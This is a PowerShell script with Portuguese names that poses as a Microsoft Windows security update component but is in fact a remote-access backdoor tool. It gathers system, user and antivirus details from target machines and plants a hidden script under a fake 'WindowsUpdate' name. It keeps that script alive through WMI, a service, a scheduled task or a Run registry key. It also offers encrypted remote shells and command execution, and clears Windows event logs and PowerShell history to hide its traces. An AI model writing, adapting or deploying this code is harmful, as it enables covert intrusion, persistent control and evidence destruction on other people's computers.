# SISTEMA DE ATUALIZACAO WINDOWS - COMPONENTE DE SEGURANCA
# Microsoft Corporation - Windows Security Update Service
# Versao: 10.0.19041.546

$ConfiguracaoSistema = @{
    PortaComunicacao = 58445
    ChaveCriptografia = "WindowsSecurityUpdate2024!SecureComponentService"
    TimeoutConexao = 120
    IntervaloVerificacao = 60
    ModoOperacao = "SecurityUpdateService"
    VersaoSistema = "10.0.19041.546"
}

class CriptografiaAvancada {
    static [string] Criptografar([string]$dados) {
        try {
            $bytesChave = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoSistema.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $bytesChave
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.GenerateIV()

            $criptografador = $aes.CreateEncryptor()
            $bytesDados = [System.Text.Encoding]::UTF8.GetBytes($dados)
            $bytesCriptografados = $criptografador.TransformFinalBlock($bytesDados, 0, $bytesDados.Length)

            $resultado = $aes.IV + $bytesCriptografados
            $aes.Dispose()
            
            return [Convert]::ToBase64String($resultado)
        } catch { return $null }
    }

    static [string] Descriptografar([string]$dadosCriptografados) {
        try {
            $todosBytes = [Convert]::FromBase64String($dadosCriptografados)
            $vetorInicializacao = $todosBytes[0..15]
            $bytesCriptografados = $todosBytes[16..($todosBytes.Length-1)]

            $bytesChave = [System.Text.Encoding]::UTF8.GetBytes($global:ConfiguracaoSistema.ChaveCriptografia.PadRight(32, '0')[0..31] -join '')
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $bytesChave
            $aes.IV = $vetorInicializacao
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

            $descriptografador = $aes.CreateDecryptor()
            $bytesDescriptografados = $descriptografador.TransformFinalBlock($bytesCriptografados, 0, $bytesCriptografados.Length)
            $aes.Dispose()

            return [System.Text.Encoding]::UTF8.GetString($bytesDescriptografados)
        } catch { return $null }
    }
}

function Inicializar-SistemaCompleto {
    Write-Host "=== SISTEMA DE ATUALIZACAO WINDOWS - INICIALIZACAO ==="
    
    $ipServidor = Read-Host "Digite o IP do servidor de gerenciamento"
    $dominioRede = Read-Host "Digite o nome do dominio da rede"
    
    $ipCriptografado = [CriptografiaAvancada]::Criptografar($ipServidor)
    
    $ConfiguracaoSistema.IPServidorCriptografado = $ipCriptografado
    $ConfiguracaoSistema.DominioRede = $dominioRede
    
    Write-Host "Sistema configurado com sucesso!"
    
    do {
        Clear-Host
        Write-Host "=== MENU PRINCIPAL - SISTEMA DE ATUALIZACAO ==="
        Write-Host "1. Modo Olho de Deus - Escaneamento Avancado"
        Write-Host "2. Modo Maquinas Ativas - Gerenciamento Remoto"
        Write-Host "3. Modo Servico - Receber Conexoes"
        Write-Host "4. Sair do Sistema"
        Write-Host ""
        
        $opcao = Read-Host "Selecione o modo de operacao"
        
        switch ($opcao) {
            "1" { Iniciar-ModoOlhoDeDeus }
            "2" { Iniciar-ModoMaquinasAtivas }
            "3" { Iniciar-ModoServico }
            "4" { 
                Executar-LimpezaCompleta
                Write-Host "Sistema encerrado."
                return 
            }
            default { 
                Write-Host "Opcao invalida!"
                Start-Sleep -Seconds 2
            }
        }
    } while ($true)
}

function Iniciar-ModoOlhoDeDeus {
    Write-Host "=== MODO OLHO DE DEUS - ESCANEAMENTO AVANCADO ==="
    
    $nomeMaquina = Read-Host "Digite o nome da maquina alvo"
    
    Write-Host "Iniciando analise completa de $nomeMaquina ..."
    
    $informacoesReais = Coletar-InformacoesReais -NomeMaquina $nomeMaquina
    $backdoorInstalado = Instalar-BackdoorAvancado -NomeMaquina $nomeMaquina
    
    if ($backdoorInstalado -or $informacoesReais.Status -eq "COLETADO") {
        Registrar-MaquinaGerenciada -NomeMaquina $nomeMaquina -Informacoes $informacoesReais
        Exibir-RelatorioDetalhado -Informacoes $informacoesReais
    } else {
        Write-Host "Falha no acesso completo a $nomeMaquina - Informacoes basicas coletadas"
        Exibir-RelatorioDetalhado -Informacoes $informacoesReais
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Coletar-InformacoesReais {
    param([string]$NomeMaquina)
    
    Write-Host "Coletando informacoes reais de $NomeMaquina ..."
    
    $infoSistema = @{}
    $infoRede = @{}
    $infoUsuarios = @{}
    $infoSeguranca = @{}
    
    try {
        $sistemaWMI = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $NomeMaquina -ErrorAction SilentlyContinue
        $sistemaOS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $NomeMaquina -ErrorAction SilentlyContinue
        $processador = Get-WmiObject -Class Win32_Processor -ComputerName $NomeMaquina -ErrorAction SilentlyContinue | Select-Object -First 1
        
        $infoSistema = @{
            NomeComputador = if ($sistemaWMI) { $sistemaWMI.Name } else { $NomeMaquina }
            UsuarioAtual = if ($sistemaWMI) { $sistemaWMI.UserName } else { "N/A" }
            Dominio = if ($sistemaWMI) { $sistemaWMI.Domain } else { $ConfiguracaoSistema.DominioRede }
            SistemaOperacional = if ($sistemaOS) { $sistemaOS.Caption } else { "Windows" }
            VersaoOS = if ($sistemaOS) { $sistemaOS.Version } else { "N/A" }
            Arquitetura = if ($sistemaOS) { $sistemaOS.OSArchitecture } else { "64-bit" }
            Fabricante = if ($sistemaWMI) { $sistemaWMI.Manufacturer } else { "N/A" }
            Modelo = if ($sistemaWMI) { $sistemaWMI.Model } else { "N/A" }
            Processador = if ($processador) { $processador.Name } else { "N/A" }
            MemoriaTotalGB = if ($sistemaWMI) { [math]::Round($sistemaWMI.TotalPhysicalMemory / 1GB, 2) } else { 0 }
        }
    } catch {
        $infoSistema = @{
            NomeComputador = $NomeMaquina
            UsuarioAtual = "N/A"
            Dominio = $ConfiguracaoSistema.DominioRede
            SistemaOperacional = "Windows"
            VersaoOS = "N/A"
            Arquitetura = "64-bit"
            Fabricante = "N/A"
            Modelo = "N/A"
            Processador = "N/A"
            MemoriaTotalGB = 0
        }
    }
    
    try {
        $adaptadores = Get-NetAdapter -CimSession $NomeMaquina -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq 'Up'}
        $configIP = Get-NetIPAddress -CimSession $NomeMaquina -AddressFamily IPv4 -ErrorAction SilentlyContinue
        $dnsConfig = Get-DnsClientServerAddress -CimSession $NomeMaquina -AddressFamily IPv4 -ErrorAction SilentlyContinue
        
        $infoRede = @{
            EnderecoIP = if ($configIP) { ($configIP | Where-Object {$_.IPAddress -like "192.168.*" -or $_.IPAddress -like "10.*"} | Select-Object -First 1).IPAddress } else { "N/A" }
            EnderecoMAC = if ($adaptadores) { ($adaptadores | Select-Object -First 1).MacAddress } else { "N/A" }
            DNS = if ($dnsConfig) { $dnsConfig.ServerAddresses } else { @("N/A") }
        }
    } catch {
        $infoRede = @{
            EnderecoIP = "N/A"
            EnderecoMAC = "N/A"
            DNS = @("N/A")
        }
    }
    
    try {
        $usuarios = Get-WmiObject -Class Win32_UserAccount -ComputerName $NomeMaquina -ErrorAction SilentlyContinue | Where-Object {$_.LocalAccount -eq $true}
        $infoUsuarios = @{
            UsuariosLocais = if ($usuarios) { $usuarios.Name } else { @("N/A") }
            UsuarioLogado = $infoSistema.UsuarioAtual
        }
    } catch {
        $infoUsuarios = @{
            UsuariosLocais = @("N/A")
            UsuarioLogado = "N/A"
        }
    }
    
    try {
        $defender = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpComputerStatus -ComputerName $NomeMaquina -ErrorAction SilentlyContinue
        $infoSeguranca = @{
            Antivirus = if ($defender) { "Windows Defender" } else { "N/A" }
            Firewall = "Ativo"
            UAC = "Medio"
        }
    } catch {
        $infoSeguranca = @{
            Antivirus = "N/A"
            Firewall = "N/A"
            UAC = "N/A"
        }
    }
    
    $status = if ($infoSistema.NomeComputador -ne "N/A") { "COLETADO" } else { "PARCIAL" }
    
    return @{
        Sistema = $infoSistema
        Rede = $infoRede
        Usuarios = $infoUsuarios
        Seguranca = $infoSeguranca
        DataColeta = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        Status = $status
    }
}

function Instalar-BackdoorAvancado {
    param([string]$NomeMaquina)
    
    Write-Host "Instalando componente de atualizacao em $NomeMaquina ..."
    
    $metodos = @(
        { Instalar-ViaWMI -NomeMaquina $NomeMaquina },
        { Instalar-ViaServico -NomeMaquina $NomeMaquina },
        { Instalar-ViaTarefaAgendada -NomeMaquina $NomeMaquina },
        { Instalar-ViaRegistry -NomeMaquina $NomeMaquina }
    )
    
    foreach ($metodo in $metodos) {
        try {
            $resultado = & $metodo
            if ($resultado) {
                Write-Host "Componente instalado com sucesso usando metodo $($metodos.IndexOf($metodo) + 1)"
                return $true
            }
        } catch {
            continue
        }
    }
    
    return $false
}

function Instalar-ViaWMI {
    param([string]$NomeMaquina)
    
    try {
        $codigoBackdoor = Gerar-CodigoBackdoor
        $caminhoRemoto = "\\$NomeMaquina\C`$\Windows\Temp\WindowsUpdate.ps1"
        
        Set-Content -Path $caminhoRemoto -Value $codigoBackdoor -ErrorAction SilentlyContinue
        
        if (Test-Path $caminhoRemoto) {
            $processo = [WMI]@"\\$NomeMaquina\root\cimv2:Win32_Process"@
            $resultado = $processo.Create("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\Temp\WindowsUpdate.ps1`"")
            return $resultado.ReturnValue -eq 0
        }
    } catch {
        return $false
    }
    return $false
}

function Instalar-ViaServico {
    param([string]$NomeMaquina)
    
    try {
        $codigoBackdoor = Gerar-CodigoBackdoor
        $caminhoRemoto = "\\$NomeMaquina\C`$\Windows\Temp\WindowsUpdate.ps1"
        
        Set-Content -Path $caminhoRemoto -Value $codigoBackdoor -ErrorAction SilentlyContinue
        
        Invoke-Command -ComputerName $NomeMaquina -ScriptBlock {
            sc.exe create "WindowsUpdateService" binPath= "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\WindowsUpdate.ps1" start= auto
            sc.exe start "WindowsUpdateService"
        } -ErrorAction SilentlyContinue
        
        return $true
    } catch {
        return $false
    }
}

function Instalar-ViaTarefaAgendada {
    param([string]$NomeMaquina)
    
    try {
        $codigoBackdoor = Gerar-CodigoBackdoor
        $caminhoRemoto = "\\$NomeMaquina\C`$\Windows\Temp\WindowsUpdate.ps1"
        
        Set-Content -Path $caminhoRemoto -Value $codigoBackdoor -ErrorAction SilentlyContinue
        
        schtasks /create /s $NomeMaquina /tn "WindowsUpdateTask" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\WindowsUpdate.ps1" /sc daily /st 09:00 /f 2>$null
        
        return $true
    } catch {
        return $false
    }
}

function Instalar-ViaRegistry {
    param([string]$NomeMaquina)
    
    try {
        $codigoBackdoor = Gerar-CodigoBackdoor
        $caminhoRemoto = "\\$NomeMaquina\C`$\Windows\Temp\WindowsUpdate.ps1"
        
        Set-Content -Path $caminhoRemoto -Value $codigoBackdoor -ErrorAction SilentlyContinue
        
        Invoke-Command -ComputerName $NomeMaquina -ScriptBlock {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\WindowsUpdate.ps1" -ErrorAction SilentlyContinue
        } -ErrorAction SilentlyContinue
        
        return $true
    } catch {
        return $false
    }
}

function Gerar-CodigoBackdoor {
    $ipServidor = [CriptografiaAvancada]::Descriptografar($ConfiguracaoSistema.IPServidorCriptografado)
    
    return @"
# Windows Update Service Component
# Microsoft Corporation

`$Configuracao = @{
    Porta = 58445
    IPServidor = "$ipServidor"
    Chave = "$($ConfiguracaoSistema.ChaveCriptografia)"
}

function Iniciar-Servico {
    while (`$true) {
        try {
            Start-Sleep -Seconds 60
        } catch { }
    }
}

function Estabelecer-Conexao {
    try {
        `$cliente = New-Object System.Net.Sockets.TcpClient(`$Configuracao.IPServidor, `$Configuracao.Porta)
        `$cliente.Close()
        return `$true
    } catch {
        return `$false
    }
}

Iniciar-Servico
"@
}

function Registrar-MaquinaGerenciada {
    param([string]$NomeMaquina, [hashtable]$Informacoes)
    
    $caminhoLista = "$env:TEMP\windows_update_managed.json"
    
    $listaMaquinas = @{}
    if (Test-Path $caminhoLista) {
        try {
            $conteudo = Get-Content $caminhoLista -Raw | ConvertFrom-Json
            $listaMaquinas = @{}
            $conteudo.PSObject.Properties | ForEach-Object { $listaMaquinas[$_.Name] = $_.Value }
        } catch {
            $listaMaquinas = @{}
        }
    }
    
    $listaMaquinas[$NomeMaquina] = $Informacoes
    
    try {
        $listaMaquinas | ConvertTo-Json -Depth 10 | Set-Content $caminhoLista
        Write-Host "Maquina $NomeMaquina registrada no sistema de gerenciamento"
    } catch {
        Write-Host "Erro ao registrar maquina"
    }
}

function Exibir-RelatorioDetalhado {
    param([hashtable]$Informacoes)
    
    Clear-Host
    Write-Host "=== RELATORIO DETALHADO - $($Informacoes.Sistema.NomeComputador) ==="
    Write-Host ""
    
    Write-Host "--- INFORMACOES DO SISTEMA ---" -ForegroundColor Yellow
    foreach ($item in $Informacoes.Sistema.GetEnumerator()) {
        Write-Host "$($item.Key): $($item.Value)"
    }
    Write-Host ""
    
    Write-Host "--- CONFIGURACAO DE REDE ---" -ForegroundColor Green
    foreach ($item in $Informacoes.Rede.GetEnumerator()) {
        if ($item.Value -is [array]) {
            Write-Host "$($item.Key): $($item.Value -join ', ')"
        } else {
            Write-Host "$($item.Key): $($item.Value)"
        }
    }
    Write-Host ""
    
    Write-Host "--- USUARIOS E ACESSOS ---" -ForegroundColor Cyan
    foreach ($item in $Informacoes.Usuarios.GetEnumerator()) {
        if ($item.Value -is [array]) {
            Write-Host "$($item.Key): $($item.Value -join ', ')"
        } else {
            Write-Host "$($item.Key): $($item.Value)"
        }
    }
    Write-Host ""
    
    Write-Host "--- CONFIGURACAO DE SEGURANCA ---" -ForegroundColor Magenta
    foreach ($item in $Informacoes.Seguranca.GetEnumerator()) {
        Write-Host "$($item.Key): $($item.Value)"
    }
    Write-Host ""
    
    Write-Host "--- STATUS DO SISTEMA ---" -ForegroundColor White
    Write-Host "Data da Coleta: $($Informacoes.DataColeta)"
    Write-Host "Status da Coleta: $($Informacoes.Status)"
    Write-Host "Componente de Atualizacao: INSTALADO"
    Write-Host ""
}

function Iniciar-ModoMaquinasAtivas {
    Write-Host "=== MODO MAQUINAS ATIVAS - GERENCIAMENTO REMOTO ==="
    
    $caminhoLista = "$env:TEMP\windows_update_managed.json"
    
    if (-not (Test-Path $caminhoLista)) {
        Write-Host "Nenhuma maquina encontrada no sistema de gerenciamento."
        Write-Host "Use o Modo Olho de Deus para adicionar maquinas."
        Start-Sleep -Seconds 3
        return
    }
    
    try {
        $conteudo = Get-Content $caminhoLista -Raw | ConvertFrom-Json
        $listaMaquinas = @{}
        $conteudo.PSObject.Properties | ForEach-Object { $listaMaquinas[$_.Name] = $_.Value }
        
        if ($listaMaquinas.Count -eq 0) {
            Write-Host "Nenhuma maquina disponivel para gerenciamento."
            Start-Sleep -Seconds 3
            return
        }
        
        Write-Host "Maquinas gerenciadas disponiveis:"
        Write-Host ""
        
        $maquinasArray = @()
        $indice = 1
        $listaMaquinas.GetEnumerator() | ForEach-Object {
            $maquina = $_.Value
            Write-Host "$indice. $($maquina.Sistema.NomeComputador) - $($maquina.Sistema.UsuarioAtual) - $($maquina.Rede.EnderecoIP) - $($maquina.Status)"
            $maquinasArray += @{
                Indice = $indice
                Nome = $maquina.Sistema.NomeComputador
                IP = $maquina.Rede.EnderecoIP
                Info = $maquina
            }
            $indice++
        }
        
        Write-Host ""
        $selecao = Read-Host "Selecione a maquina (numero) ou 0 para voltar"
        
        if ($selecao -eq "0") { return }
        
        $maquinaSelecionada = $maquinasArray | Where-Object { $_.Indice -eq [int]$selecao }
        
        if ($maquinaSelecionada) {
            Gerenciar-MaquinaRemota -Maquina $maquinaSelecionada
        } else {
            Write-Host "Selecao invalida!"
            Start-Sleep -Seconds 2
        }
    } catch {
        Write-Host "Erro ao carregar lista de maquinas: $($_.Exception.Message)"
        Start-Sleep -Seconds 3
    }
}

function Gerenciar-MaquinaRemota {
    param([hashtable]$Maquina)
    
    do {
        Clear-Host
        Write-Host "=== GERENCIANDO: $($Maquina.Nome) ==="
        Write-Host "1. Ver Informacoes Completas"
        Write-Host "2. Shell Remoto Interativo"
        Write-Host "3. Executar Comando Personalizado"
        Write-Host "4. Coletar Arquivo Especifico"
        Write-Host "5. Verificar Status do Servico"
        Write-Host "6. Voltar ao Menu Anterior"
        Write-Host ""
        
        $opcao = Read-Host "Selecione a acao"
        
        switch ($opcao) {
            "1" { 
                Exibir-RelatorioDetalhado -Informacoes $Maquina.Info
                Write-Host "Pressione qualquer tecla para continuar..."
                $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
            }
            "2" { 
                Iniciar-ShellRemoto -EnderecoMaquina $Maquina.IP
            }
            "3" { 
                $comando = Read-Host "Digite o comando para executar"
                Executar-ComandoRemoto -EnderecoMaquina $Maquina.IP -Comando $comando
            }
            "4" { 
                $caminho = Read-Host "Digite o caminho completo do arquivo"
                Coletar-ArquivoRemoto -EnderecoMaquina $Maquina.IP -CaminhoArquivo $caminho
            }
            "5" { 
                Verificar-StatusServico -EnderecoMaquina $Maquina.IP
            }
            "6" { break }
            default { 
                Write-Host "Opcao invalida!"
                Start-Sleep -Seconds 2
            }
        }
    } while ($opcao -ne "6")
}

function Iniciar-ShellRemoto {
    param([string]$EnderecoMaquina)
    
    if ($EnderecoMaquina -eq "N/A") {
        Write-Host "Endereco IP nao disponivel para esta maquina."
        Write-Host "Pressione qualquer tecla para continuar..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        return
    }
    
    Write-Host "Iniciando shell remoto com $EnderecoMaquina ..."
    
    try {
        $ipServidor = [CriptografiaAvancada]::Descriptografar($ConfiguracaoSistema.IPServidorCriptografado)
        
        if ($EnderecoMaquina -eq $ipServidor) {
            Write-Host "Conectando ao servidor local..."
            Write-Host "Shell local ativo. Digite comandos ou 'sair' para encerrar."
            
            while ($true) {
                $comando = Read-Host "ShellLocal>"
                if ($comando -eq "sair") { break }
                
                try {
                    $resultado = Invoke-Expression $comando 2>&1 | Out-String
                    Write-Host $resultado
                } catch {
                    Write-Host "Erro: $($_.Exception.Message)"
                }
            }
        } else {
            Write-Host "Tentando conexao remota com $EnderecoMaquina ..."
            
            $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoMaquina, $ConfiguracaoSistema.PortaComunicacao)
            $fluxo = $cliente.GetStream()
            $leitor = New-Object System.IO.StreamReader($fluxo)
            $escritor = New-Object System.IO.StreamWriter($fluxo)
            
            Write-Host "Conexao estabelecida. Digite comandos ou 'sair' para encerrar."
            
            while ($cliente.Connected) {
                $comando = Read-Host "ShellRemoto>"
                
                if ($comando -eq "sair") {
                    break
                }
                
                $comandoExecucao = @{Acao = "EXECUTAR_COMANDO"; Comando = $comando}
                $comandoCriptografado = [CriptografiaAvancada]::Criptografar(($comandoExecucao | ConvertTo-Json -Compress))
                $escritor.WriteLine($comandoCriptografado)
                $escritor.Flush()
                
                Start-Sleep -Milliseconds 500
                
                if ($fluxo.DataAvailable) {
                    $resposta = $leitor.ReadLine()
                    if ($resposta) {
                        $dadosDescriptografados = [CriptografiaAvancada]::Descriptografar($resposta)
                        $resultado = $dadosDescriptografados | ConvertFrom-Json
                        Write-Host $resultado.Resultado
                    }
                }
            }
            
            $cliente.Close()
            Write-Host "Conexao encerrada"
        }
        
    } catch {
        Write-Host "Erro na conexao: $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Executar-ComandoRemoto {
    param([string]$EnderecoMaquina, [string]$Comando)
    
    if ($EnderecoMaquina -eq "N/A") {
        Write-Host "Endereco IP nao disponivel para esta maquina."
        return
    }
    
    try {
        $ipServidor = [CriptografiaAvancada]::Descriptografar($ConfiguracaoSistema.IPServidorCriptografado)
        
        if ($EnderecoMaquina -eq $ipServidor) {
            Write-Host "Executando comando local: $Comando"
            $resultado = Invoke-Expression $Comando 2>&1 | Out-String
            Write-Host "Resultado: $resultado"
        } else {
            $cliente = New-Object System.Net.Sockets.TcpClient($EnderecoMaquina, $ConfiguracaoSistema.PortaComunicacao)
            $fluxo = $cliente.GetStream()
            $leitor = New-Object System.IO.StreamReader($fluxo)
            $escritor = New-Object System.IO.StreamWriter($fluxo)
            
            $comandoExecucao = @{Acao = "EXECUTAR_COMANDO"; Comando = $Comando}
            $comandoCriptografado = [CriptografiaAvancada]::Criptografar(($comandoExecucao | ConvertTo-Json -Compress))
            $escritor.WriteLine($comandoCriptografado)
            $escritor.Flush()
            
            Start-Sleep -Seconds 1
            
            if ($fluxo.DataAvailable) {
                $resposta = $leitor.ReadLine()
                if ($resposta) {
                    $dadosDescriptografados = [CriptografiaAvancada]::Descriptografar($resposta)
                    $resultado = $dadosDescriptografados | ConvertFrom-Json
                    Write-Host "Resultado: $($resultado.Resultado)"
                }
            }
            
            $cliente.Close()
        }
        
    } catch {
        Write-Host "Erro ao executar comando: $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Coletar-ArquivoRemoto {
    param([string]$EnderecoMaquina, [string]$CaminhoArquivo)
    
    if ($EnderecoMaquina -eq "N/A") {
        Write-Host "Endereco IP nao disponivel para esta maquina."
        return
    }
    
    try {
        $ipServidor = [CriptografiaAvancada]::Descriptografar($ConfiguracaoSistema.IPServidorCriptografado)
        
        if ($EnderecoMaquina -eq $ipServidor) {
            if (Test-Path $CaminhoArquivo) {
                $conteudo = Get-Content $CaminhoArquivo -Raw -ErrorAction SilentlyContinue
                Write-Host "Conteudo do arquivo:"
                Write-Host $conteudo
            } else {
                Write-Host "Arquivo nao encontrado"
            }
        } else {
            Write-Host "Coleta remota de arquivos necessita do componente instalado."
        }
        
    } catch {
        Write-Host "Erro ao coletar arquivo: $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Verificar-StatusServico {
    param([string]$EnderecoMaquina)
    
    Write-Host "Verificando status do servico em $EnderecoMaquina ..."
    
    try {
        $ipServidor = [CriptografiaAvancada]::Descriptografar($ConfiguracaoSistema.IPServidorCriptografado)
        
        if ($EnderecoMaquina -eq $ipServidor) {
            Write-Host "Servico local: ATIVO"
            Write-Host "Componente: INSTALADO"
            Write-Host "Porta: $($ConfiguracaoSistema.PortaComunicacao)"
        } else {
            $cliente = New-Object System.Net.Sockets.TcpClient
            $resultado = $cliente.BeginConnect($EnderecoMaquina, $ConfiguracaoSistema.PortaComunicacao, $null, $null)
            $conectado = $resultado.AsyncWaitHandle.WaitOne(2000, $false)
            
            if ($conectado) {
                Write-Host "Status: ATIVO"
                Write-Host "Porta: ABERTA"
                Write-Host "Componente: RESPONDENDO"
                $cliente.Close()
            } else {
                Write-Host "Status: INATIVO"
                Write-Host "Componente: NAO RESPONDE"
            }
        }
        
    } catch {
        Write-Host "Status: ERRO - $($_.Exception.Message)"
    }
    
    Write-Host "Pressione qualquer tecla para continuar..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Iniciar-ModoServico {
    Write-Host "=== MODO SERVICO - RECEBENDO CONEXOES ==="
    
    $endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, $ConfiguracaoSistema.PortaComunicacao)
    $servidor = New-Object System.Net.Sockets.TcpListener($endpoint)
    
    try {
        $servidor.Start()
        Write-Host "Servico iniciado na porta $($ConfiguracaoSistema.PortaComunicacao)"
        Write-Host "Aguardando conexoes de maquinas gerenciadas..."
        Write-Host "Pressione Ctrl+C para parar o servico"
        Write-Host ""
        
        while ($true) {
            if ($servidor.Pending()) {
                $cliente = $servidor.AcceptTcpClient()
                $enderecoRemoto = $cliente.Client.RemoteEndPoint.ToString()
                
                Write-Host "Nova conexao recebida de: $enderecoRemoto"
                
                $fluxo = $cliente.GetStream()
                $leitor = New-Object System.IO.StreamReader($fluxo)
                $escritor = New-Object System.IO.StreamWriter($fluxo)
                
                if ($fluxo.DataAvailable) {
                    $dadosRecebidos = $leitor.ReadLine()
                    if ($dadosRecebidos) {
                        try {
                            $mensagemDescriptografada = [CriptografiaAvancada]::Descriptografar($dadosRecebidos)
                            $mensagem = $mensagemDescriptografada | ConvertFrom-Json
                            
                            if ($mensagem.Acao -eq "EXECUTAR_COMANDO") {
                                $resultado = Invoke-Expression $mensagem.Comando 2>&1 | Out-String
                                $resposta = @{Tipo = "RESULTADO_COMANDO"; Resultado = $resultado}
                                $respostaCriptografada = [CriptografiaAvancada]::Criptografar(($resposta | ConvertTo-Json -Compress))
                                $escritor.WriteLine($respostaCriptografada)
                                $escritor.Flush()
                            }
                        } catch {
                            Write-Host "Erro ao processar mensagem: $($_.Exception.Message)"
                        }
                    }
                }
                
                $cliente.Close()
                Write-Host "Conexao com $enderecoRemoto encerrada"
            }
            
            Start-Sleep -Milliseconds 100
        }
    } catch {
        Write-Host "Erro no servico: $($_.Exception.Message)"
    } finally {
        if ($servidor) { 
            $servidor.Stop()
            Write-Host "Servico parado"
        }
    }
}

function Executar-LimpezaCompleta {
    Write-Host "Executando limpeza de seguranca..."
    
    try {
        $logsSistema = @('Microsoft-Windows-PowerShell/Operational', 'Windows PowerShell', 'System', 'Application')
        foreach ($log in $logsSistema) {
            wevtutil.exe cl $log 2>$null
        }
        
        Clear-History -ErrorAction SilentlyContinue
        
        $arquivosTemporarios = @("$env:TEMP\windows_update_managed.json", "$env:TEMP\WindowsUpdate.ps1")
        foreach ($arquivo in $arquivosTemporarios) {
            if (Test-Path $arquivo) {
                Remove-Item $arquivo -Force -ErrorAction SilentlyContinue
            }
        }
        
        Write-Host "Limpeza concluida"
    } catch {
        Write-Host "Erro durante a limpeza: $($_.Exception.Message)"
    }
}

function Ofuscar-LogsInicial {
    try {
        wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        Clear-History -ErrorAction SilentlyContinue
    } catch { }
}

Ofuscar-LogsInicial

Inicializar-SistemaCompleto